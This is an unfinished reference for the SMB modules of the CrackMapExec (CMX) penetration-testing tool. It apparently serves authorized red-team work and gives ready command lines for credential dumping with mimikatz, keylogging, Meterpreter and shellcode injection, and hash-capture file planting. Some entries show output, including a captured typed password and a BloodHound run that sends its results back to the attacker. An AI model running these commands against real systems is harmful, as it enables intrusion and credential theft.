# SMB: Modules Reference
Created by: @awsmhacks  
Updated: 8/20/19   
CMX Version: 5.0.1
  
** NOT FINISHED **


**Notes:**  
* The following examples assume you have a Kali Linux host connected to an internal network.    
* For the examples it is also assumed hosts are within a 192.168.1.0/24 IP space.   
* If CMX isnt giving output of anykind, you probably have something wrong with the command.   
- - -(better timeout messages are still a work-in-progress)  
  

--------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------

# Modules

## List available SMB modules
Returns a list of loaded modules. The protocol can be replaced, i.e. {smb, http, mssql, winrm, ssh}
```
~# cmx smb -L
```
**Expected Results:**
```
[*] mimikatz                  Dumps all logon credentials from memory
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## List Module Options
Returns options specific to a module
```
~# cmx smb -M <module_name> --options
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## Specifying Module Options
Module options are specified using -o after the module name  
All options should be specified in the form KEY=VALUE  
When using several options, seperate with a space  
    i.e -o KEY=VALUE KEY=VALUE KEY=VALUE  
```
~# cmx smb -M <module_name> -o KEY=VALUE [KEY=VALUE] [KEY=VALUE]
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## Using Modules (and Options)
Modules must be specified after the protocol, target and credentials.  
Many Modules have default options, otherwise options must be specified.   
```
~# cmx <protocol> <target> <credentials> -M <module_name> [-o KEY=VALUE [KEY=VALUE] [KEY=VALUE]]
```
**Example:**
```
~# cmx smb 192.168.1.0/24 -u Admin -p 'p@ssw0rd' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------







# SMB Modules Reference
--------------------------------------------------------------------------------------------------------------------------------------------------------
## bloodhound 
Executes the BloodHound recon script on the target and retreives the results onto the attackers' machine

**Notes:**
CMX uses this bloodhound.ps1 file   
XXX
which may be out-of-date with the latest bloodhound(sharphound) release
  
Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
        THREADS           Max numbers of threads to execute on target (defaults to 20)
        COLLECTIONMETHOD  Method used by BloodHound ingestor to collect data (defaults to 'Default') 
                                Can be 'Group','ACLs','ComputerOnly','LocalGroup','GPOLocalGroup', 'Session','LoggedOn','Trusts','Stealth', or 'Default'
        CSVPATH           (optional) Path where csv files will be written on target (defaults to C:\)
        NEO4JURI          (optional) URI for direct Neo4j ingestion (defaults to blank)
        NEO4JUSER         (optional) Username for direct Neo4j ingestion
        NEO4JPASS         (optional) Pass for direct Neo4j ingestion
```

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M bloodhound -o THREADS=25 COLLECTIONMETHOD=Default
```
**Expected Results:**
```
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB         192.168.1.121    445    DESKTOP1         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.121    445    DESKTOP1         [+] PACIFIC\tcat:User!23 (Pwn3d!)
BLOODHOU... 192.168.1.121    445    DESKTOP1         [+] Executed launcher
BLOODHOU...                                         [*] Waiting on 1 host(s)
BLOODHOU... 192.168.1.121                            [*] - - "GET /BloodHound-modified.ps1 HTTP/1.1" 200 -
BLOODHOU... 192.168.1.121                            [+] Executing payload... this can take a few minutes...
BLOODHOU...                                         [*] Waiting on 1 host(s)
BLOODHOU... 192.168.1.121                            [*] - - "POST / HTTP/1.1" 200 -
BLOODHOU... 192.168.1.121                            [*] Saved csv output to user_sessions-192.168.1.121-2018-11-28_120010.csv
BLOODHOU... 192.168.1.121                            [*] Saved csv output to group_membership.csv-192.168.1.121-2018-11-28_120010.csv
BLOODHOU... 192.168.1.121                            [*] Saved csv output to local_admins.csv-192.168.1.121-2018-11-28_120010.csv
BLOODHOU... 192.168.1.121                            [*] Saved csv output to trusts.csv-192.168.1.121-2018-11-28_120010.csv
BLOODHOU... 192.168.1.121                            [+] Successfully retreived data
```

CSV output files are saved to /root/.cmx/logs/
```
~# ls -l /root/.cmx/logs/
-rw-r--r-- 1 root root      40 Nov 28 12:00 group_membership.csv-192.168.1.121-2018-11-28_120010.csv
-rw-r--r-- 1 root root      43 Nov 28 12:00 local_admins.csv-192.168.1.121-2018-11-28_120010.csv
-rw-r--r-- 1 root root      72 Nov 28 12:00 trusts.csv-192.168.1.121-2018-11-28_120010.csv
-rw-r--r-- 1 root root      35 Nov 28 12:00 user_sessions-192.168.1.121-2018-11-28_120010.csv
```

**Example usage w/direct connection to neo4j:**

**Note:** 
    To use this you need to edit the default neo4j config at /usr/share/neo4j/conf/neo4j.config  
    Jump down to the "Network connector configuration"  
    Edit or just uncomment the line (to listen on all interfaces)  
        dbms.connectors.default_listen_address=0.0.0.0    
The neo4juri parameter will then be the ip address of the box running neo4j, port 7474 by default  

```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M bloodhound -o NEO4JURI='bolt://10.10.33.200:7687' NEO4JUSER=neo4j NEO4JPASS=neo4j2 COLLECTIONMETHOD=Default
```
**Expected Results:**
```
SMB         192.168.1.121    445    DESKTOP1         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.121    445    DESKTOP1         [+] PACIFIC\tcat:User!23 (Pwn3d!)
BLOODHOU... 192.168.1.121    445    DESKTOP1         [+] Executed launcher
BLOODHOU...                                         [*] Waiting on 1 host(s)
BLOODHOU... 192.168.1.121                            [*] - - "GET /BloodHound-modified.ps1 HTTP/1.1" 200 -
BLOODHOU... 192.168.1.121                            [+] Executing payload... this can take a few minutes...
BLOODHOU... 192.168.1.121                            [*] - - "POST / HTTP/1.1" 200 -
BLOODHOU... 192.168.1.121                            [+] Successfully retreived data
```
Then just fire up bloodhound and refresh the DB

--------------------------------------------------------------------------------------------------------------------------------------------------------
## empire_exec   
### the api has been dropped in empire, this is no longer supported.


--------------------------------------------------------------------------------------------------------------------------------------------------------
## enum_avproducts           
Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI

**Options:**
None

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 


**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M enum_avproducts
```
**Expected Results:**
(This was ran against a host running Windows Defender and Sentinel 1)
```
SMB         192.168.1.121    445    DESKTOP3         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP3) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.121    445    DESKTOP3         [+] PACIFIC\tcat:User!23 (Pwn3d!)
ENUM_AVP... 192.168.1.121    445    DESKTOP3         [+] Found Anti-Spyware product:
ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {CAC39F2D-1B9C-4A72-5A17-3B3D19BB2B34}
ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Microsoft Security Essentials
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\Microsoft Security Client\msseces.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\Microsoft Security Client\MsMpEng.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 397312
ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Windows Defender
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => %ProgramFiles%\Windows Defender\MSASCui.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => %SystemRoot%\System32\svchost.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 393472
ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {32093CFB-7D72-C309-45BF-16D0A556244B}
ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Sentinel Agent
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelRemediation.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelAgent.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 266240
ENUM_AVP... 192.168.1.121    445    DESKTOP3         [+] Found Anti-Virus product:
ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {71A27EC9-3DA6-45FC-60A7-004F623C6189}
ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Microsoft Security Essentials
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\Microsoft Security Client\msseces.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\Microsoft Security Client\MsMpEng.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 397312
ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {8968DD1F-5B48-CC87-7F0F-2DA2DED16EF6}
ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Sentinel Agent
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelRemediation.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelAgent.exe
ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 266240
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## enum_chrome
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223
Decrypts saved Chrome passwords using Get-ChromeDump

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
None

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M enum_chrome
```
**Expected Results:**
```
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## enum_dns  
Uses WMI to dump DNS from an AD DNS Server.
The target must be a domain controller(s) and you must be running with DA or equivalant credentials

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
        DOMAIN      Domain to enumerate DNS for. Defaults to all zones.
```
Suggest leaving DOMAIN blank and it will attempt to find all domains.  
See "Domains Retrieved" in the example.  
**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M enum_dns
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
ENUM_DNS    192.168.1.110    445    DC2016A          [+] Domains retrieved: ['_msdcs.ocean.depth', 'pacific.ocean.depth']
ENUM_DNS    192.168.1.110    445    DC2016A          Results for _msdcs.ocean.depth
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: CNAME
ENUM_DNS    192.168.1.110    445    DC2016A              d4c78a2d-50c2-412c-ba64-19cf8794dac4._msdcs.ocean.depth: dc2012a.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A              f9cc19ac-1af0-4438-8017-eae79dcbe1fd._msdcs.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: NS
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2012a.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: SOA
ENUM_DNS    192.168.1.110    445    DC2016A              _msdcs.ocean.depth: dc2016a.pacific.ocean.depth. hostmaster.ocean.depth.  8811 900 600 86400 3600
ENUM_DNS    192.168.1.110    445    DC2016A          Results for pacific.ocean.depth
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: A
ENUM_DNS    192.168.1.110    445    DC2016A              DESKTOP2.pacific.ocean.depth: 10.10.33.122
ENUM_DNS    192.168.1.110    445    DC2016A              Desktop3.pacific.ocean.depth: 192.168.1.121
ENUM_DNS    192.168.1.110    445    DC2016A              SERVER1.pacific.ocean.depth: 10.10.33.111
ENUM_DNS    192.168.1.110    445    DC2016A              SERVER2.pacific.ocean.depth: 10.10.33.112
ENUM_DNS    192.168.1.110    445    DC2016A              dc2016a.pacific.ocean.depth: 192.168.1.110
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: 192.168.1.110
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: NS
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: dc2016a.pacific.ocean.depth.
ENUM_DNS    192.168.1.110    445    DC2016A          Record Type: SOA
ENUM_DNS    192.168.1.110    445    DC2016A              pacific.ocean.depth: dc2016a.pacific.ocean.depth. hostmaster.pacific.ocean.depth.  464 900 600 86400 3600
ENUM_DNS    192.168.1.110    445    DC2016A          [*] Saved raw output to DNS-Enum-192.168.1.110-2018-11-28_173000.log

~# 
```
Output files are saved to /root/.cmx/logs/

--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_keystrokes   
Executes PowerSploit's Get-Keystrokes script  
Needs to be killed manually after recieving the Got Keys! message  
using Ctrl+C  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
*   TIMEOUT   Specifies the interval in minutes to capture keystrokes.
    STREAM    Specifies whether to stream the keys over the network (default: False)
    POLL      Specifies the interval in seconds to poll the log file (default: 20)
```
**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M get_keystrokes -o TIMEOUT=2
```
**Expected Results:**
```
GET_KEYS...                                         [*] This module will not exit until CTRL-C is pressed
GET_KEYS...                                         [*] Keystrokes will be stored in ~/.cmx/logs

SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GET_KEYS... 192.168.1.110    445    DC2016A          [+] Executed launcher
GET_KEYS... 192.168.1.110                            [*] - - "GET /Invoke-PSInject.ps1 HTTP/1.1" 200 -
GET_KEYS... 192.168.1.110                            [*] - - "GET /Get-Keystrokes.ps1 HTTP/1.1" 200 -
GET_KEYS... 192.168.1.110    445    DC2016A          [+] Got keys! Stored in /root/.cmx/logs/get_keystrokes_192.168.1.110/keys_Administrator.log
^CKeyboardInterrupt
2018-11-29T20:29:28Z
```
**Results File:**
Output files are saved to /root/.cmx/logs/get_keystrokes_\<targetIP\>/  
Results are of the form:  
"Key pressed","username: application","date"  
Below example grabbed the Administrator typing "ssh root@10.10.10.10" the "p@ssword!"  
```
~# cat /root/.cmx/logs/get_keystrokes_192.168.1.110/keys_Administrator.log

��"TypedKey","WindowTitle","Time"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:24 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:24 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"h","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"< >","Administrator: Command Prompt","11/29/2018 12:32:25 PM"
"r","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"t","Administrator: Command Prompt","11/29/2018 12:32:26 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:27 PM"
"@","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:28 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:29 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:30 PM"
".","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"1","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"0","Administrator: Command Prompt","11/29/2018 12:32:31 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:32 PM"
"p","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"@","Administrator: Command Prompt","11/29/2018 12:32:34 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:35 PM"
"s","Administrator: Command Prompt","11/29/2018 12:32:35 PM"
"w","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"o","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"r","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"d","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"<Shift>","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"!","Administrator: Command Prompt","11/29/2018 12:32:36 PM"
"<Enter>","Administrator: Command Prompt","11/29/2018 12:32:37 PM"
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_netdomaincontroller
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223  
Enumerates all domain controllers  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_netdomaincontroller
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_netrdpsession 
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223          
Enumerates all active RDP sessions  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
    INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_netrdpsession
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## get_timedscreenshot  
### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223    
Executes PowerSploit's Get-TimedScreenshot script  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
*   INTERVAL  Specifies the interval in seconds between taking screenshots.
*   ENDTIME   Specifies when the script should stop running in the format HH:MM (Military Time).
```

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M get_timedscreenshot -o INTERVAL=30 ENDTIME=16:04
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## gpp_autologin             
Searches the domain controller for registry.xml to find autologon information and returns the username and password.  
Target needs to be a Domain Controller? (Only way it worked for me)

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
True | True | True | True 

**Options:**
```
```

**Example Usage:**
```
~# cmx smb 192.168.1.110 -u Administrator -p 'AAdmin!23' -M gpp_autologin
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GPP_AUTO... 192.168.1.110    445    DC2016A          [+] Found SYSVOL share
GPP_AUTO... 192.168.1.110    445    DC2016A          [*] Searching for Registry.xml
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## gpp_password              
Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.  
Target needs to be a Domain Controller? (Only way it worked for me)

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | true | true 

**Options:**
```
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M gpp_password
```
**Expected Results:**
```
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:PACIFIC) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [+] PACIFIC\Administrator:AAdmin!23 (Pwn3d!)
GPP_PASS... 192.168.1.110    445    DC2016A          [+] Found SYSVOL share
GPP_PASS... 192.168.1.110    445    DC2016A          [*] Searching for potential XML files containing passwords
~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## invoke_sessiongopher      
Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher  

Multiple_Host | Requires LA | Requires DA 
|---|---|---|
true | true | false 

**Options:**
```
    THOROUGH   Searches entire filesystem for certain file extensions (default: False)
    ALLDOMAIN  Queries Active Direcotry for a list of all domain-joined computers and runs SessionGopher against all of them (default: False)    
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M invoke_sessiongopher
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## invoke_vnc                
Injects a VNC client in memory

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    CONTYPE   Specifies the VNC connection type, choices are: reverse, bind (default: reverse).
    PORT      VNC Port (default: 5900)
    PASSWORD  Specifies the connection password.
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M invoke_vnc
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## met_inject                
Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
    LHOST    IP hosting the handler
    LPORT    Handler port
    PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
    PROCID   Process ID to inject into (default: current powershell process)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M met_inject
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikatz                  
Its mimikatz... 

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```
    COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikatz_enum_chrome      
Executes PowerSploit's Invoke-Mimikatz.ps1 script (Mimikatz's DPAPI Module) to decrypt saved Chrome passwords  
        Pros and cons vs the standard enum_chrome module:  
            + Opsec safe, doesn't touch disk  
            - Tends to error out and/or not decrypt all stored credentials (not sure why exactly, should work perfectly in theory)  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true  

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz_enum_chrome
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikatz_enum_vault_creds 
Executes PowerSploit's Invoke-Mimikatz.ps1 script and decrypts stored credentials in Windows Vault/Credential Manager

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz_enum_vault_creds
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## mimikittenz               
Executes the Mimikittenz script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikittenz
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## multirdp                  
Patches terminal services in memory to allow multiple RDP users

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M multirdp
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## netripper                 
Injects NetRipper in memory using PowerShell  
        Note: NetRipper doesn't support injecting into x64 processes yet, which very much limits its use case  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
*   PROCESS   Process to hook, only x86 processes are supported by NetRipper currently 
                (Choices: firefox, chrome, putty, winscp, outlook, lync) 
```
*Fails for chrome currently*

**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M netripper -o PROCESS=firefox
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## pe_inject                 
Downloads the specified DLL/EXE and injects it into memory using PowerSploit's Invoke-ReflectivePEInjection.ps1 script  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    PATH     Path to dll/exe to inject
    PROCID   Process ID to inject into (default: current powershell process)
    EXEARGS  Arguments to pass to the executable being reflectively loaded (default: None)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M pe_inject 
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## rdp                       
Enables/Disables RDP  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False  

**Options:**
```
    ACTION  Enable/Disable RDP (choices: enable, disable)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M rdp
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## scuffy                    
Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    SERVER      IP of the SMB server
    NAME        SCF file name
    CLEANUP     Cleanup (choices: True or False)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M scuffy
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## shellcode_inject          
Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    PATH     Path to the file containing raw shellcode to inject
    PROCID   Process ID to inject into (default: current powershell process)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M shellcode_inject
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## slinky                    
Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | False 

**Options:**
```
    SERVER        IP of the SMB server
    NAME          LNK file name
    CLEANUP       Cleanup (choices: True or False)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M slinky
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## test_connection           
Executes the Test-Connection PowerShell cmdlet  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    HOST      Host to ping
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M test_connection
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## tokens                    
Enumerates available tokens using Powersploit's Invoke-TokenManipulation  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    USER      Search for the specified username in available tokens (default: None)
    USERFILE  File containing usernames to search for in available tokens (defult: None)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M tokens
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## uac                       
Checks UAC status  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```

```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M uac
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## wdigest                   
Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    ACTION  Create/Delete the registry key (choices: enable, disable)
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M wdigest
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------
## web_delivery 
